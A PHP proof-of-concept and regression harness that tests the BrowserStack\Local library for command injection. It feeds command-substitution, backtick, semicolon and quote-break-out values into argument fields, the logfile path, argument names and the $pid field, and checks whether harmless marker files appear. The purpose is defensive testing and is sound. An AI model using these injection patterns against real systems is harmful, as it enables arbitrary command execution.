<?php
/**
 * Command-injection proof-of-concept / regression harness for BrowserStack\Local
 * (CWE-78, CWE-88).
 *
 * Run it from anywhere:
 *
 *     php tests/manual/injection-poc.php
 *
 * It is self-locating (loads lib/ relative to this file) and NEVER launches the
 * real BrowserStackLocal binary: binary_path is pointed at /bin/echo, so the only
 * thing that can run besides echo is an injected payload. Each arm writes a
 * marker file into the temp dir; a marker that exists means the shell executed
 * attacker-controlled bytes.
 *
 * Exit 0 = every payload was passed through as inert argv data (fixed).
 * Exit 1 = at least one payload executed (vulnerable).
 *
 * Note on the payload shape: the assembled command starts with the `exec`
 * builtin, which replaces the shell with the binary, so a trailing `; cmd`
 * chain never gets its turn. Command substitution -- $(...) and backticks --
 * is expanded *before* `exec` runs, so that is the primitive these arms use.
 * The `; cmd` arms are kept as well to document the difference.
 */

$repo = dirname(dirname(__DIR__));
if (!file_exists($repo . '/lib/Local.php')) {
    fwrite(STDERR, "cannot find lib/Local.php under $repo\n");
    exit(2);
}
require_once $repo . '/lib/LocalException.php';
require_once $repo . '/lib/LocalBinary.php';
require_once $repo . '/lib/Local.php';

$tmp = rtrim(sys_get_temp_dir(), '/');
$vulnerable = 0;
$arm = 0;

function marker($n) {
    global $tmp;
    $m = $tmp . '/bsl_injection_poc_' . $n;
    if (file_exists($m)) { unlink($m); }
    return $m;
}

/** Build a command through the library, run it, and report whether $marker appeared. */
function run_arm($label, $marker, $build) {
    global $vulnerable, $arm;
    $arm++;
    $command = null;
    $note = '';
    try {
        $command = $build();
    } catch (BrowserStack\LocalException $e) {
        $note = 'rejected by add_args: ' . $e->getMessage();
    }
    if ($command !== null) {
        shell_exec($command . ' 2>&1');
    }
    $fired = file_exists($marker);
    printf("ARM %d  %-44s payload_executed=%s\n", $arm, $label, $fired ? 'YES  <-- VULNERABLE' : 'no');
    if ($note !== '') {
        printf("       %s\n", $note);
    }
    if ($command !== null) {
        printf("       command: %s\n", $command);
    }
    if ($fired) { $vulnerable++; unlink($marker); }
}

function fresh_local() {
    $local = new BrowserStack\Local();
    $local->binary_path = '/bin/echo';
    $local->add_args('key', 'dummykey');
    return $local;
}

// -- F-002: known argument fields interpolated into the command string --------
$m = marker(1);
run_arm('localIdentifier, command substitution', $m, function () use ($m) {
    $local = fresh_local();
    $local->add_args('localIdentifier', 'x$(touch ' . $m . ')');
    return $local->start_command();
});

$m = marker(2);
run_arm('proxyHost, backticks', $m, function () use ($m) {
    $local = fresh_local();
    $local->add_args('proxyHost', 'x`touch ' . $m . '`');
    return $local->start_command();
});

$m = marker(3);
run_arm('hosts, command substitution', $m, function () use ($m) {
    $local = fresh_local();
    $local->add_args('hosts', 'x$(touch ' . $m . ')');
    return $local->start_command();
});

$m = marker(4);
run_arm('localIdentifier, semicolon chain', $m, function () use ($m) {
    $local = fresh_local();
    $local->add_args('localIdentifier', 'x; touch ' . $m . '; echo');
    return $local->start_command();
});

// -- F-002: the logfile path reaches both shell sinks -------------------------
$m = marker(5);
run_arm('logfile, single-quote break-out', $m, function () use ($m) {
    $local = fresh_local();
    $local->add_args('logfile', "/tmp/bsl_poc.log'\$(touch " . $m . ")'");
    return $local->start_command();
});

// (start()'s own `system("echo \"\" > <logfile>")` truncation call takes the same
// caller-supplied logfile and is quoted the same way; it is not exercised here
// because reaching start() would download and launch the real binary.)

// -- F-003: the add_args() else-branch, via the KEY and via the VALUE ---------
$m = marker(7);
run_arm('arbitrary arg_key (injection via the name)', $m, function () use ($m) {
    $local = fresh_local();
    $local->add_args('x$(touch ' . $m . ')', 'v');
    return $local->start_command();
});

$m = marker(8);
run_arm('custom flag value, quote break-out', $m, function () use ($m) {
    $local = fresh_local();
    $local->add_args('customFlag', "' \$(touch " . $m . ") '");
    return $local->start_command();
});

// -- F-008: attacker-controlled $pid reaching the isRunning() shell call ------
$arm++;
$m = marker(9);
$local = new BrowserStack\Local();
$local->pid = 'aux$(touch ' . $m . ')';
$local->isRunning();
$fired = file_exists($m);
printf("ARM %d  %-44s payload_executed=%s\n", $arm, 'public $pid -> isRunning()', $fired ? 'YES  <-- VULNERABLE' : 'no');
if ($fired) { $vulnerable++; unlink($m); }

// -- stop_command() inherits the localIdentifier fragment ---------------------
$arm++;
$m = marker(10);
$local = fresh_local();
$local->add_args('localIdentifier', 'x$(touch ' . $m . ')');
shell_exec($local->stop_command() . ' 2>&1');
$fired = file_exists($m);
printf("ARM %d  %-44s payload_executed=%s\n", $arm, 'localIdentifier -> stop_command()', $fired ? 'YES  <-- VULNERABLE' : 'no');
printf("       command: %s\n", $local->stop_command());
if ($fired) { $vulnerable++; unlink($m); }

echo "\n";
if ($vulnerable > 0) {
    echo "RESULT: VULNERABLE - $vulnerable of $arm arms executed attacker-controlled commands.\n";
    exit(1);
}
echo "RESULT: OK - all $arm payloads were passed through as inert argv data.\n";
exit(0);
